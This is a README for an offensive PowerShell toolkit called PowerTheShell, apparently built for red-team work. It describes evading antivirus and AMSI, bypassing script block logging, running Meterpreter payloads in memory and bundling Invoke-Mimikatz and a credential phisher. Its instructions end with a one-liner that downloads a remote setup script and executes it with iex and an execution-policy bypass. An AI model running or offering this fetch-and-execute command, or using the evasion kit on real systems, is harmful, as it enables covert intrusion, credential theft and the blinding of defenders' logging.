# PowerTheShell

This repository was created for learning / demonstration purposes and is based on a post by <a href="https://twitter.com/_xpn_" rel="nofollow">@<em>xpn</em></a>, more details available <a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" rel="nofollow">here</a>.

The goal is:

1. Perform everything in memory without touching the hard disk
2. Run well-known scripts without being intercepted by the AV
3. Execute payload meterpreter without being intercepted by the AV
4. Minimize trace in EventViewer

The main script Setup.ps1 performs the necessary commands for protecting our operational security:

1. Script block logging bypass by Ryan Cobb (@cobbr_io)

The main script Setup.ps1 plus AMSI-Setup.ps1 performs one of the following AMSI evasion techniques:

1. Reflection by Matt Graeber (@mattifestation)
2. Patching by Tal Liberman (@Tal_Liberman)
3. Erro forcing by Adam Chester (@_xpn_)

Once the setup phase is over, you can run the console and all its scripts without using any obfuscation technique. In fact, only the commands necessary for AMSI evasion technique are obfuscated.
The command necessary for Script block logging bypass are also obfuscated not for evade AMSI but for leave minimum trace on EventViewer. 

This repository contains well-known scripts such as Invoke-Mimikatz Invoke-Powershell Invoke-CrerdentialPhisher that
they have been patched or customized for solving issue and easy integration. The customization performed do not compromise the signature of the scripts.

# Instructions

To start the console run this line

powershell -Execution bypass "iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Setup.ps1'))"
